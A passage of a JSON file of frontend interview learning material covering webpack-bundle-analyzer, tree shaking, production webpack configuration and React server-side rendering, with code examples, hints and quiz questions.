          "solutionCode": "## Solution: Bundle Analysis and Optimization Strategy\n\n**1. Tool Setup:**\nTo enable `webpack-bundle-analyzer`, I would first install it as a development dependency:\n```bash\nnpm install --save-dev webpack-bundle-analyzer\n# or\nyarn add --dev webpack-bundle-analyzer\n```\nThen, I would add it to the `plugins` array in the `webpack.config.js`:\n```javascript\nconst BundleAnalyzerPlugin = require('webpack-bundle-analyzer').BundleAnalyzerPlugin;\n\nmodule.exports = {\n  // ... other webpack config\n  plugins: [\n    new BundleAnalyzerPlugin({\n      analyzerMode: 'static', // Generates an HTML file, useful for CI/CD\n      reportFilename: 'bundle-report.html', // Output file name\n      openAnalyzer: false // Prevent opening automatically, useful for CI/CD or specific script\n    })\n  ],\n};\n```\nFinally, I would run a production build of the application (e.g., `npm run build`), which would generate the `bundle-report.html` file in the output directory. I would then open this HTML file in a browser.\n\n**2. Analysis (What to Look For in the Report):**\nUpon opening the interactive treemap report, I would focus on the following:\n*   **Largest Rectangles (Modules/Dependencies)**: Immediately identify the largest blocks, which represent the biggest contributors to the bundle size. This helps prioritize optimization efforts.\n*   **Duplicate Dependencies**: Look for multiple instances of the same library (e.g., different versions of `lodash` or `moment`) that could be resolved by configuring Webpack's `resolve.alias` or `optimization.splitChunks`.\n*   **Unused Code (Dead Code)**: While the analyzer itself doesn't directly show unused code, very large components or libraries that are rarely used could indicate poor tree-shaking effectiveness or unnecessary imports.\n*   **Shared Dependencies**: Identify modules that are included in multiple chunks, which might be candidates for further `splitChunks` configuration.\n\n**3. Optimization Strategies:**\nBased on the analysis, I would employ a combination of these strategies:\n*   **A. Code Splitting (Route/Component-Based)**: If the analyzer shows that entire feature modules or pages are bundled into the initial chunk, I would implement `React.lazy` and `Suspense` (or dynamic `import()` for non-React contexts) to lazy-load these components only when they are needed (e.g., when a user navigates to a specific route). This significantly reduces the initial payload.\n    *   *Example*: `const AdminDashboard = React.lazy(() => import('./AdminDashboard'));`\n*   **B. Tree Shaking & Smaller Imports**: For large third-party libraries, I would ensure effective tree shaking is enabled (Webpack does this by default for ES Modules in production). More importantly, I would switch from importing entire libraries (e.g., `import { Button } from 'antd';` instead of `import Antd from 'antd';`) or use specific utility imports (e.g., `import get from 'lodash/get';` instead of `import _ from 'lodash';`). If a library doesn't support tree shaking, I'd consider alternatives.\n*   **C. Dependency Optimization / Deduplication**: If duplicate libraries are found, I'd explicitly set up Webpack's `resolve.alias` or `optimization.splitChunks.cacheGroups` to ensure only one version of a library is bundled, or that common vendor code is extracted into its own cacheable chunk, preventing repetition across multiple bundles.\n*   **D. Image Optimization**: While not directly shown in JS bundles, large images are common culprits. I would use image optimization tools (Webpack loaders like `image-webpack-loader` or external services) to compress and serve appropriately sized images.\n\n**4. Verification:**\nAfter implementing optimizations, I would verify their effectiveness by:\n*   **Re-running Webpack Bundle Analyzer**: Generate a new report and visually compare it with the previous one. I would expect to see smaller rectangle sizes for optimized modules/dependencies and potentially new, smaller chunks for lazy-loaded code.\n*   **Performance Metrics (Lighthouse/WebPageTest)**: Use tools like Google Lighthouse (in Chrome DevTools) or WebPageTest to measure key performance metrics (First Contentful Paint, Largest Contentful Paint, Time to Interactive, Total Blocking Time) before and after optimizations. I'd specifically look for improvements in 'Time to Interactive' and 'Total Blocking Time' as these are directly impacted by JavaScript bundle size.",
          "testCases": [
            "The strategy should clearly outline how to set up the analyzer.",
            "The strategy should identify specific types of issues visible in the analyzer's output (e.g., large modules, duplicates).",
            "At least three distinct, actionable optimization strategies should be proposed, explaining how they address identified issues.",
            "A clear method for verifying the success of optimizations should be described (re-analysis, performance metrics)."
          ],
          "hints": [
            "Think about what a treemap visually represents regarding file sizes.",
            "Consider common causes of large JavaScript bundles beyond just application code.",
            "How do `import()` statements relate to Webpack's chunking?",
            "What performance metrics are most relevant when optimizing bundle size?"
          ],
          "tags": [
            "Webpack",
            "Performance Optimization",
            "Bundle Analysis",
            "Code Splitting",
            "Tree Shaking",
            "Frontend Interview",
            "Architecture"
          ],
          "timeEstimate": 75,
          "prerequisites": [
            "Webpack Configuration",
            "Code Splitting Concepts",
            "General Web Performance knowledge"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "expert",
          "relatedConcepts": [
            "Web Performance Metrics",
            "CI/CD Integration",
            "Build Tools"
          ]
        }
      ]
    }
  },
  {
    "id": "e508a269-88ad-4265-86f3-d0e691df2ddf",
    "startLine": 12300,
    "endLine": 12399,
    "processedDate": "2025-06-17T12:51:27.624Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_bundle_analyzer_plugin",
          "title": "Webpack Bundle Analyzer Plugin",
          "content": "The Webpack Bundle Analyzer is a powerful tool for visualizing the size of webpack output files with an interactive treemap. It helps developers understand what makes up the bundle size, identify large modules or dependencies, and pinpoint areas for optimization.\n\n## Key Concepts\n*   **Bundle Visualization:** Provides a graphical representation of your webpack bundle, showing the size of each module and dependency.\n*   **Interactive Treemap:** Allows for detailed exploration of bundle content, enabling drill-down into specific sections.\n*   **Optimization Insights:** Helps in identifying duplicate modules, large libraries, or unused code that might be contributing to a bloated bundle.\n\n## Installation\n```bash\nnpm install --save-dev webpack-bundle-analyzer\n```\n\n## Usage\nTo use the plugin, import it and add it to the `plugins` array in your `webpack.config.js` file, typically within the `plugins` section of your configuration.\n\n```javascript\n// webpack.config.js\nconst BundleAnalyzerPlugin = require('webpack-bundle-analyzer').BundleAnalyzerPlugin;\n\nmodule.exports = {\n  // ... other webpack configurations\n  plugins: [\n    new BundleAnalyzerPlugin() // Add the plugin here\n  ]\n};\n```\n\nWhen webpack runs with this plugin, it will open a browser window displaying the treemap visualization of your build output.",
          "examples": [
            {
              "id": "example_bundle_analyzer_1",
              "title": "Basic Webpack Configuration with Bundle Analyzer",
              "code": "const path = require('path');\nconst BundleAnalyzerPlugin = require('webpack-bundle-analyzer').BundleAnalyzerPlugin;\n\nmodule.exports = {\n  mode: 'production',\n  entry: './src/index.js',\n  output: {\n    path: path.resolve(__dirname, 'dist'),\n    filename: 'bundle.js',\n  },\n  plugins: [\n    new BundleAnalyzerPlugin({\n      analyzerMode: 'static', // Generates a static HTML file instead of starting a server\n      openAnalyzer: false,    // Prevents opening browser automatically\n      reportFilename: 'bundle-report.html' // Custom report file name\n    })\n  ]\n};\n",
              "explanation": "This example shows a basic webpack configuration for a production build, integrating the `BundleAnalyzerPlugin`. The `analyzerMode` is set to 'static' to generate an HTML report file, and `openAnalyzer` is set to `false` to prevent the browser from automatically opening. This setup is useful for CI/CD environments or when you want to review the report later.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_bundle_analyzer_1",
            "question_bundle_analyzer_2",
            "question_bundle_analyzer_3",
            "question_bundle_analyzer_4"
          ],
          "relatedTasks": [
            "task_bundle_analyzer_1"
          ],
          "tags": [
            "webpack",
            "bundle-optimization",
            "tooling",
            "performance"
          ],
          "technology": "Webpack",
          "prerequisites": [
            "webpack_basics",
            "javascript_modules"
          ],
          "complexity": 5,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "requiredFor": [
            "performance_optimization",
            "webpack_advanced_config"
          ]
        },
        {
          "id": "theory_tree_shaking",
          "title": "Tree Shaking",
          "content": "Tree shaking, also known as 'dead code elimination', is a form of optimization used by modern JavaScript bundlers (like Webpack, Rollup, Parcel) to remove unused code from your final bundle. The term 'tree shaking' comes from the mental model of your application as a tree: the live code branches are included, and the dead code leaves are shaken off.\n\n## How it Works\nTree shaking relies on ES Modules (ESM) `import` and `export` statements. Unlike CommonJS `require()`, ESM imports are static, meaning the bundler can analyze the dependency graph at compile time to determine which exports are actually used. If an exported module member is never imported or used, it can be safely removed.\n\n## Benefits\n*   **Reduced Bundle Size:** Directly leads to smaller JavaScript bundles.\n*   **Improved Load Times:** Smaller bundles download faster, improving initial page load performance.\n*   **Better Performance:** Less code to parse and execute in the browser.\n\n## Prerequisites for Effective Tree Shaking\n1.  **ES Modules (ESM):** Your code and the libraries you use must be written using `import` and `export` syntax. Libraries often provide an `es` or `module` field in their `package.json` to point to their ESM build.\n2.  **Side-Effect Free Modules:** For optimal tree shaking, modules should be 'side-effect free'. A side effect is code that performs actions beyond just returning a value (e.g., modifying global scope, logging). Webpack can be informed about side-effect free modules via `\"sideEffects\": false` in `package.json` or specific configuration.\n3.  **Webpack Configuration:** Ensure your webpack configuration (especially in 'production' mode) is set up to perform tree shaking (e.g., `optimization.usedExports = true`, `TerserPlugin` for minification).\n\n## Practical Examples for Tree Shaking\nTo effectively tree shake, you should import only the specific functions or components you need, rather than importing an entire library.\n\n```javascript\n// Bad Practice: Imports the entire lodash library\nimport lodash from 'lodash';\nconst array1 = lodash.chunk(['a', 'b', 'c', 'd'], 2);\nconst array2 = lodash.flatten([1, [2, 3], 4]); // Even if flatten is not used, it's included.\n\n// Good Practice: Imports specific functions using ES Modules for tree shaking\nimport { chunk } from 'lodash-es'; // lodash-es provides ESM compatible builds\nconst array3 = chunk(['a', 'b', 'c', 'd'], 2);\n\n// Even Better: Imports specific functions from individual packages/paths\n// Many libraries offer direct paths to modules for even finer control\nimport chunk from 'lodash/chunk'; // Points directly to the chunk module\nconst array4 = chunk(['a', 'b', 'c', 'd'], 2);\n```\nIn the 'Good' and 'Even Better' examples, only the `chunk` function (and its dependencies) would be included in the final bundle, assuming `flatten` or other `lodash` functions are not used elsewhere.",
          "examples": [
            {
              "id": "example_tree_shaking_1",
              "title": "Demonstrating Tree Shaking Effectiveness",
              "code": "// my-utils.js\nexport function add(a, b) {\n  console.log('add called');\n  return a + b;\n}\n\nexport function subtract(a, b) {\n  console.log('subtract called');\n  return a - b;\n}\n\n// index.js\nimport { add } from './my-utils';\n\nconst sum = add(5, 3);\nconsole.log(sum);\n\n// If bundled with tree shaking enabled, 'subtract' function will be removed from the final bundle\n// because it's never imported or used.\n",
              "explanation": "This example demonstrates how tree shaking works. The `my-utils.js` file exports two functions: `add` and `subtract`. In `index.js`, only the `add` function is imported and used. When a bundler with tree shaking (like webpack in production mode) processes this, it will detect that `subtract` is unused and eliminate it from the final output, reducing bundle size.",
              "language": "javascript"
            },
            {
              "id": "example_tree_shaking_2",
              "title": "Configuring Webpack for Tree Shaking",
              "code": "const path = require('path');\n\nmodule.exports = {\n  mode: 'production',\n  entry: './src/index.js',\n  output: {\n    filename: 'bundle.js',\n    path: path.resolve(__dirname, 'dist'),\n  },\n  optimization: {\n    usedExports: true, // Tell webpack to detect unused exports\n    minimize: true,    // Enable minification\n    minimizer: [\n      new (require('terser-webpack-plugin'))({\n        extractComments: false, // Prevent creation of separate license files\n      }),\n    ],\n  },\n  // Important: Ensure package.json has \"sideEffects\": false for libraries\n  // or specify sideEffects in webpack config if needed.\n  // Example: in package.json\n  // {\n  //   \"name\": \"my-app\",\n  //   \"version\": \"1.0.0\",\n  //   \"sideEffects\": false, // Indicates that all modules in the package are side-effect free\n  //   ...\n  // }\n};\n",
              "explanation": "This webpack configuration snippet shows how to enable and optimize tree shaking. Setting `mode` to 'production' automatically enables many optimizations, including `usedExports: true` by default (though explicitly setting it is good for clarity). `TerserPlugin` is crucial for actually removing the dead code during minification. The `sideEffects` property in `package.json` is vital for informing webpack about modules that can be safely removed without causing issues.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_tree_shaking_1",
            "question_tree_shaking_2",
            "question_tree_shaking_3",
            "question_tree_shaking_4",
            "question_tree_shaking_5",
            "question_tree_shaking_6"
          ],
          "relatedTasks": [
            "task_tree_shaking_1"
          ],
          "tags": [
            "webpack",
            "performance",
            "optimization",
            "javascript",
            "es-modules"
          ],
          "technology": "Webpack",
          "prerequisites": [
            "javascript_modules",
            "webpack_basics"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "performance_optimization",
            "bundle_size_reduction"
          ]
        },
        {
          "id": "theory_webpack_production_config",
          "title": "Webpack Configuration Best Practices for Production",
          "content": "Optimizing a webpack configuration for production is crucial for achieving small, fast, and cached bundles. This involves setting the `mode` to 'production' and leveraging various optimization features and plugins.\n\n## Core Production Configuration\n\n### `mode: 'production'`\nSetting `mode` to `'production'` automatically enables many built-in optimizations in webpack, such as minification, tree shaking, scope hoisting, and more.\n\n```javascript\nmodule.exports = {\n  mode: 'production',\n  // ...\n};\n```\n\n### Output Configuration\n\n*   **`filename: '[name].[contenthash].js'`**: Using `[contenthash]` in the output filename is critical for cache busting. The `contenthash` changes only when the content of the file changes, allowing browsers to cache static assets effectively. `[name]` refers to the entry point name.\n*   **`chunkFilename: '[name].[contenthash].chunk.js'`**: Similar to `filename`, this applies to non-entry chunks (e.g., those created by code splitting or dynamic imports). It ensures that dynamically loaded modules also benefit from cache busting.\n\n```javascript\noutput: {\n  path: path.resolve(__dirname, 'dist'),\n  filename: '[name].[contenthash].js',\n  chunkFilename: '[name].[contenthash].chunk.js',\n},\n```\n\n### Optimization\n\n#### `minimize` and `minimizer`\n*   **`minimize: true`**: Enables minification of the output bundles. This is often automatically true in production mode.\n*   **`minimizer`**: An array of plugins used to minify your code. Common ones include:\n    *   **`TerserPlugin`**: For minifying JavaScript. It replaces UglifyJSPlugin and offers advanced optimizations like dead code elimination, mangling, and more.\n    *   **`CssMinimizerPlugin`**: For minifying CSS. It uses `cssnano` or other processors to reduce CSS file size.\n\n```javascript\noptimization: {\n  minimize: true,\n  minimizer: [\n    new TerserPlugin({ /* options */ }),\n    new CssMinimizerPlugin(),\n  ],\n  // ...\n},\n```\n\n#### Code Splitting (`splitChunks`)\n`splitChunks` allows webpack to split your code into various chunks, which can be loaded on demand or in parallel. This significantly improves initial load time by only loading what's immediately necessary.\n\n*   **`chunks: 'all'`**: Optimizes all types of chunks (initial, async, and `all`).\n*   **`maxInitialRequests: Infinity`**: Controls how many parallel requests can be made for an entry point. `Infinity` allows as many as needed, which can be beneficial with HTTP/2.\n*   **`minSize: 0`**: Ensures even small modules are considered for splitting if they meet other criteria.\n*   **`cacheGroups`**: Defines groups of modules that should be bundled together. A common use case is bundling vendor (node_modules) code separately.\n    *   **`vendor` group**: Often used to put all code from `node_modules` into a separate chunk. The `name` function can derive a unique name for each vendor package, aiding in specific caching strategies.\n\n```javascript\noptimization: {\n  // ...\n  splitChunks: {\n    chunks: 'all',\n    maxInitialRequests: Infinity,\n    minSize: 0,\n    cacheGroups: {\n      vendor: {\n        test: /[\\\\/]node_modules[\\\\/]/,\n        name(module) {\n          const packageName = module.context.match(/[\\\\/]node_modules[\\\\/](.+?)(?:[\\\\/]|$)/)[1];\n          return `npm.${packageName.replace('@', '')}`; // e.g., npm.react, npm.lodash\n        },\n      },\n    },\n  },\n  // ...\n},\n```\n\n#### `runtimeChunk: 'single'`\nThis option creates a separate chunk for the webpack runtime code. This is beneficial because the runtime chunk contains the webpack manifest, which changes frequently. By separating it, other content-hashed bundles will remain unchanged when only the manifest changes, improving long-term caching.\n\n```javascript\noptimization: {\n  // ...\n  runtimeChunk: 'single',\n},\n```\n\n### Production Plugins\n\n*   **`MiniCssExtractPlugin`**: Extracts CSS into separate files instead of bundling it into JavaScript. This allows CSS to be loaded in parallel, preventing Flash of Unstyled Content (FOUC).\n    *   `filename: '[name].[contenthash].css'`**: Uses `contenthash` for CSS files for effective caching.\n\n*   **`CompressionPlugin`**: Prepares compressed versions of your assets (e.g., `.gz` or `.br` files) that can be served by the web server (e.g., Nginx, Apache) if the client supports it, reducing download size and improving speed.\n\n*   **`webpack.ids.HashedModuleIdsPlugin` (or `webpack.HashedModuleIdsPlugin` in older versions)**:\n    This plugin (or `optimization.moduleIds: 'hashed'` in webpack 5) ensures that module IDs are hashed based on their content. Without it, if a new module is added or an existing one is removed, the order of module IDs can shift, causing unrelated module hashes to change and invalidating client caches. Using content-based hashing stabilizes module IDs.\n\n```javascript\nplugins: [\n  new MiniCssExtractPlugin({\n    filename: '[name].[contenthash].css',\n  }),\n  new CompressionPlugin(),\n  new webpack.ids.HashedModuleIdsPlugin(), // For stable module IDs across builds\n],\n```\n\nThese practices combined lead to highly optimized, performant, and efficiently cached frontend applications.",
          "examples": [
            {
              "id": "example_webpack_prod_config_1",
              "title": "Comprehensive Production Webpack Config",
              "code": "const path = require('path');\nconst webpack = require('webpack');\nconst MiniCssExtractPlugin = require('mini-css-extract-plugin');\nconst CssMinimizerPlugin = require('css-minimizer-webpack-plugin');\nconst TerserPlugin = require('terser-webpack-plugin');\nconst CompressionPlugin = require('compression-webpack-plugin');\n\nmodule.exports = {\n  mode: 'production',\n  entry: './src/index.js',\n  output: {\n    path: path.resolve(__dirname, 'dist'),\n    filename: '[name].[contenthash].js',\n    chunkFilename: '[name].[contenthash].chunk.js',\n    clean: true, // Cleans the output directory before each build\n  },\n  module: {\n    rules: [\n      {\n        test: /\\.css$/,\n        use: [MiniCssExtractPlugin.loader, 'css-loader'],\n      },\n      {\n        test: /\\.js$/,\n        exclude: /node_modules/,\n        use: 'babel-loader',\n      },\n    ],\n  },\n  optimization: {\n    minimize: true,\n    minimizer: [\n      new TerserPlugin({\n        parallel: true, // Use multi-process parallel running to improve build speed\n        terserOptions: {\n          compress: {\n            drop_console: true, // Remove console.log in production\n          },\n          format: {\n            comments: false, // Remove comments\n          },\n        },\n        extractComments: false,\n      }),\n      new CssMinimizerPlugin(),\n    ],\n    splitChunks: {\n      chunks: 'all',\n      maxInitialRequests: Infinity,\n      minSize: 0,\n      cacheGroups: {\n        vendor: {\n          test: /[\\\\/]node_modules[\\\\/]/,\n          name(module) {\n            const packageName = module.context.match(/[\\\\/]node_modules[\\\\/](.+?)(?:[\\\\/]|$)/)[1];\n            return `npm.${packageName.replace('@', '')}`; // e.g., npm.react, npm.lodash\n          },\n        },\n      },\n    },\n    runtimeChunk: 'single',\n  },\n  plugins: [\n    new MiniCssExtractPlugin({\n      filename: '[name].[contenthash].css',\n    }),\n    new CompressionPlugin({\n      test: /\\.js$|\\.css$|\\.html$|\\.svg$/,\n      threshold: 8192, // Only assets bigger than this size are processed\n      minRatio: 0.8,   // Compress only if the compression ratio is better than this\n    }),\n    new webpack.ids.HashedModuleIdsPlugin(),\n  ],\n};\n",
              "explanation": "This example provides a full webpack production configuration demonstrating many best practices. It includes `mode: 'production'`, content hashing for output files, `TerserPlugin` for JS minification with console log removal, `CssMinimizerPlugin` for CSS, aggressive code splitting for vendors and other chunks, a separate runtime chunk for caching stability, `MiniCssExtractPlugin` for external CSS, `CompressionPlugin` for pre-compressed assets, and `HashedModuleIdsPlugin` for stable module IDs. The `clean: true` option is added to `output` to ensure the `dist` folder is cleared before each build.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_webpack_prod_config_1",
            "question_webpack_prod_config_2",
            "question_webpack_prod_config_3",
            "question_webpack_prod_config_4",
            "question_webpack_prod_config_5",
            "question_webpack_prod_config_6",
            "question_webpack_prod_config_7",
            "question_webpack_prod_config_8"
          ],
          "relatedTasks": [
            "task_webpack_prod_config_1",
            "task_webpack_prod_config_2"
          ],
          "tags": [
            "webpack",
            "performance",
            "optimization",
            "build-tools",
            "caching",
            "production"
          ],
          "technology": "Webpack",
          "prerequisites": [
            "webpack_basics",
            "javascript_modules",
            "npm_package_management"
          ],
          "complexity": 8,
          "interviewRelevance": 10,
          "learningPath": "advanced",
          "requiredFor": [
            "frontend_architecture",
            "devops",
            "performance_engineering"
          ]
        },
        {
          "id": "theory_server_side_rendering",
          "title": "Server-Side Rendering (SSR)",
          "content": "Server-Side Rendering (SSR) is a technique where the initial rendering of a client-side JavaScript application happens on the server. Instead of sending an empty HTML file and relying on the browser to fetch and execute JavaScript to build the DOM, the server sends a fully-rendered HTML page to the client. Once the HTML is received and displayed by the browser, the client-side JavaScript then 'hydrates' the static HTML, making it interactive.\n\n## How SSR Works\n1.  **Request:** A user's browser sends a request to the server.\n2.  **Server Rendering:** The server receives the request, executes the React (or Vue, Angular) application, and generates the initial HTML string representation of the component tree.\n3.  **Response:** The server sends this fully-formed HTML, along with references to JavaScript and CSS bundles, back to the browser.\n4.  **Initial Display:** The browser receives the HTML and immediately displays the page content to the user, providing a fast 'first paint'.\n5.  **Hydration:** In the background, the browser downloads the JavaScript bundles. Once loaded, the client-side framework (e.g., React) takes over the already rendered HTML, attaching event listeners and making the page interactive. This process is called hydration.\n\n## Benefits of SSR\n*   **Improved Initial Load Performance:** Users see content much faster because the browser doesn't have to wait for JavaScript to download and execute before rendering.\n*   **Better SEO (Search Engine Optimization):** Search engine crawlers can easily index the content because it's available directly in the HTML. While modern crawlers can execute JavaScript, SSR provides content faster and more reliably.\n*   **Enhanced User Experience:** Faster time-to-content leads to a perception of a more responsive application.\n*   **Accessibility:** Content is available even if JavaScript is disabled (though interactivity will be lost without hydration).\n\n## Challenges of SSR\n*   **Increased Server Load:** Rendering on the server consumes server CPU and memory resources. Scalability needs careful consideration.\n*   **Complexity:** Adds complexity to the development workflow, build process, and deployment.\n*   **Potential for Hydration Mismatch:** If the server-rendered HTML doesn't exactly match what the client-side JavaScript expects to render, hydration errors can occur.\n*   **Longer Time To Interactive (TTI) for complex apps:** While Time To First Byte (TTFB) and First Contentful Paint (FCP) are improved, Time To Interactive (TTI) might be delayed if large JavaScript bundles need to be downloaded and hydrated.\n\n## Basic React SSR Example with Express\n\n```javascript\n// server.js (Node.js/Express server)\nimport express from 'express';\nimport React from 'react';\nimport { renderToString } from 'react-dom/server'; // Key for server-side React rendering\nimport App from './src/App'; // Your React root component\nimport path from 'path';\n\nconst app = express();\n\n// Serve static files (e.g., bundle.js, styles.css) from the 'dist' directory\napp.use(express.static(path.resolve(__dirname, 'dist')));\n\napp.get('*', (req, res) => {\n  // Render the React component to an HTML string\n  const html = renderToString(<App />);\n  \n  // Send the fully formed HTML response\n  res.send(`\n    <!DOCTYPE html>\n    <html>\n      <head>\n        <title>My SSR App</title>\n        <link rel=\"stylesheet\" href=\"/styles.css\" />\n      </head>\n      <body>\n        <div id=\"root\">${html}</div>\n        <script src=\"/bundle.js\"></script> <!-- Client-side bundle for hydration -->\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => {\n  console.log('Server is listening on port 3000');\n});\n\n// src/App.js (Your React Root Component)\nimport React from 'react';\n\nfunction App() {\n  const [count, setCount] = React.useState(0);\n\n  return (\n    <div>\n      <h1>Hello from SSR React App!</h1>\n      <p>Count: {count}</p>\n      <button onClick={() => setCount(count + 1)}>Increment</button>\n    </div>\n  );\n}\n\nexport default App;\n\n// src/index.js (Client-side entry point for hydration)\nimport React from 'react';\nimport ReactDOM from 'react-dom/client'; // Use createRoot for React 18+ for hydration\nimport App from './App';\n\n// Hydrate the existing HTML, instead of rendering from scratch\nconst root = ReactDOM.hydrateRoot(\n  document.getElementById('root'),\n  <App />\n);\n// For React 17 and below, it would be ReactDOM.hydrate(<App />, document.getElementById('root'));\n\n// webpack.client.js (Example client-side webpack config)\n// module.exports = {\n//   entry: './src/index.js',\n//   target: 'web',\n//   output: { filename: 'bundle.js' }\n//   // ... other client-side loaders/plugins\n// };\n\n// webpack.server.js (Example server-side webpack config)\n// module.exports = {\n//   entry: './server.js',\n//   target: 'node',\n//   output: { filename: 'server.bundle.js' },\n//   // Important: externals to prevent bundling node_modules on server\n//   externals: [nodeExternals()], \n//   // ... other server-side loaders/plugins (e.g., for ES6 imports)\n// };\n```\n\nThis setup typically requires two separate webpack configurations: one for the client-side bundle and one for the server-side bundle.",
          "examples": [
            {
              "id": "example_ssr_1",
              "title": "React SSR with Initial Data",
              "code": "// server.js\nimport express from 'express';\nimport React from 'react';\nimport { renderToString } from 'react-dom/server';\nimport App from './src/App';\nimport path from 'path';\n\nconst app = express();\napp.use(express.static(path.resolve(__dirname, 'dist')));\n\napp.get('/', async (req, res) => {\n  // Simulate fetching initial data\n  const initialData = { message: 'Data fetched from server!', items: ['item1', 'item2'] };\n  \n  // Pass initial data as a prop to the App component\n  const html = renderToString(<App initialData={initialData} />);\n  \n  res.send(`\n    <!DOCTYPE html>\n    <html>\n      <head>\n        <title>My SSR App with Data</title>\n      </head>\n      <body>\n        <div id=\"root\">${html}</div>\n        <script>\n          window.__INITIAL_DATA__ = ${JSON.stringify(initialData)}; // Embed data for client hydration\n        </script>\n        <script src=\"/bundle.js\"></script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Server listening on port 3000'));\n\n// src/App.js\nimport React from 'react';\n\nfunction App({ initialData }) {\n  const [data, setData] = React.useState(initialData || { message: 'Loading...', items: [] });\n\n  // Example of client-side fetch, this would typically be done if no initialData\n  React.useEffect(() => {\n    if (!initialData) {\n      // This branch would run if client-side rendering was primary, or for subsequent data fetches\n      // console.log('Client-side data fetch simulation');\n      // setTimeout(() => setData({ message: 'Client-side data!', items: ['c-item1'] }), 500);\n    }\n  }, [initialData]);\n\n  return (\n    <div>\n      <h1>{data.message}</h1>\n      <ul>\n        {data.items.map((item, index) => <li key={index}>{item}</li>)}\n      </ul>\n      <button onClick={() => setData({ message: 'Updated!', items: ['new item'] })}>Update Client-Side</button>\n    </div>\n  );\n}\n\nexport default App;\n\n// src/index.js (Client-side entry for hydration)\nimport React from 'react';\nimport ReactDOM from 'react-dom/client';\nimport App from './App';\n\nconst root = ReactDOM.hydrateRoot(\n  document.getElementById('root'),\n  <App initialData={window.__INITIAL_DATA__} />\n);\n",
              "explanation": "This example extends the basic SSR setup to include initial data fetching on the server. The `initialData` is fetched (simulated here), passed as a prop to the React `App` component during server rendering, and then embedded into the HTML using `window.__INITIAL_DATA__`. On the client side, `ReactDOM.hydrateRoot` uses this global variable to hydrate the `App` component with the same initial state, avoiding a loading flicker and ensuring a consistent experience between server and client rendering.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_ssr_1",
            "question_ssr_2",
            "question_ssr_3",
            "question_ssr_4",
            "question_ssr_5",
            "question_ssr_6"
          ],
          "relatedTasks": [
            "task_ssr_1"
          ],
          "tags": [
            "ssr",
            "react",
            "express",
            "performance",
            "seo",
            "node.js"
          ],
          "technology": "React",
          "prerequisites": [
            "react_basics",
            "node.js_basics",
            "express_basics",
            "webpack_basics"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "requiredFor": [
            "frontend_architecture",
            "web_performance",
            "full_stack_development"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_bundle_analyzer_1",
          "topic": "Webpack Bundle Analyzer",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary purpose of the Webpack Bundle Analyzer?",
          "answer": "To visualize the size and composition of webpack output files with an interactive treemap.",
          "options": [],
          "analysisPoints": [
            "Understanding of build tools' utility.",
            "Recognition of performance optimization tools."
          ],
          "keyConcepts": [
            "Webpack",
            "Bundle Optimization",
            "Tooling"
          ],
          "evaluationCriteria": [
            "Ability to recall tool's primary function"
          ],
          "example": "",
          "tags": [
            "webpack",
            "performance",
            "tooling"
          ],
          "prerequisites": [
            "webpack_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "intermediate"
        },
        {
          "id": "question_bundle_analyzer_2",
          "topic": "Webpack Bundle Analyzer",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following is NOT a typical insight gained from using Webpack Bundle Analyzer?\n\n```javascript\n// webpack.config.js\nconst BundleAnalyzerPlugin = require('webpack-bundle-analyzer').BundleAnalyzerPlugin;\n\nmodule.exports = {\n  plugins: [\n    new BundleAnalyzerPlugin()\n  ]\n};\n```",
          "answer": "Identifying the most frequently called functions in your application at runtime.",
          "options": [
            "Identifying large third-party libraries contributing to bundle size.",
            "Detecting duplicate modules loaded into the bundle.",
            "Pinpointing custom application code that is unexpectedly large.",
            "Identifying the most frequently called functions in your application at runtime."
          ],
          "analysisPoints": [
            "Understanding the scope of static bundle analysis.",
            "Distinguishing between build-time analysis and runtime profiling."
          ],
          "keyConcepts": [
            "Webpack",
            "Bundle Analysis",
            "Performance Optimization"
          ],
          "evaluationCriteria": [
            "Understanding the capabilities and limitations of build analysis tools.",
            "Knowledge of performance profiling techniques."
          ],
          "example": "The Webpack Bundle Analyzer focuses on static analysis of the compiled bundle. It shows *what* is in the bundle and *how big* it is. It does not analyze runtime behavior like function call frequency, which would require tools like browser developer tools' performance profilers.",
          "tags": [
            "webpack",
            "performance",
            "tooling",
            "optimization"
          ],
          "prerequisites": [
            "webpack_basics",
            "javascript_performance"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_bundle_analyzer_3",
          "topic": "Webpack Bundle Analyzer",
          "level": "medium",
          "type": "open",
          "question": "After using Webpack Bundle Analyzer, you identify a significantly large third-party library. What steps would you consider to reduce its impact on your bundle size?",
          "answer": "1.  **Check for specific imports:** See if the library supports tree shaking and if you are importing only necessary parts (e.g., `import { chunk } from 'lodash-es'` instead of `import lodash from 'lodash';`).\n2.  **Evaluate alternatives:** Is there a smaller, more specialized library that can achieve the same functionality?\n3.  **Dynamic Imports (Code Splitting):** If the library is only used in certain parts of the application, consider dynamically importing it (`import()` syntax) so it's loaded only when needed.\n4.  **CDN:** For very large, widely used libraries, consider serving them from a CDN via `<script>` tags, especially if your users are likely to have them cached already. This offloads the burden from your bundle.\n5.  **Remove unused features:** If the library has optional features, ensure you're not including them if they're not needed.",
          "options": [],
          "analysisPoints": [
            "Problem-solving skills related to bundle optimization.",
            "Knowledge of various webpack and general frontend optimization techniques.",
            "Ability to prioritize optimization strategies."
          ],
          "keyConcepts": [
            "Bundle Optimization",
            "Tree Shaking",
            "Code Splitting",
            "CDN",
            "Webpack"
          ],
          "evaluationCriteria": [
            "Breadth of knowledge on performance optimization.",
            "Practical application of theoretical concepts.",
            "Ability to propose actionable solutions."
          ],
          "example": "",
          "tags": [
            "webpack",
            "performance",
